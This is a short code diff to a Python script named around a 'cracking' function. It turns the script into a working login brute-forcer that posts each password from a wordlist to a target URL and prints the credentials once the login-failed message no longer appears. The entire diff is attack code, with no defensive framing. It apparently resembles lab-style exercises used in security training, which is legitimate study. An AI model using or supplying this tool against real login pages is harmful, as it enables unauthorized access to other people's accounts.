@@ -10,13 +10,18 @@ def cracking(username, url):
     for password in passwords:
         password = password.strip()
         print(f'{password}')
-        data = {
-                ' username' : username, 
-                ' password' : password,
-                ' Login ' : ' submit '
+        payload = {
+                'username' : username, 
+                'password' : password,
+                'Login' : 'submit'
                 }
-        requests.post(url, data=data)
-
+        response = requests.post(url, data=payload)
+        if login_failed in response.content.decode():
+            pass
+        else:
+            print(f'[+] Username Found:{username}')
+            print(f'[+] Found Password:{password}')
+            exit()
 
 with open(password_file, 'r') as passwords:
     cracking(username, url) 
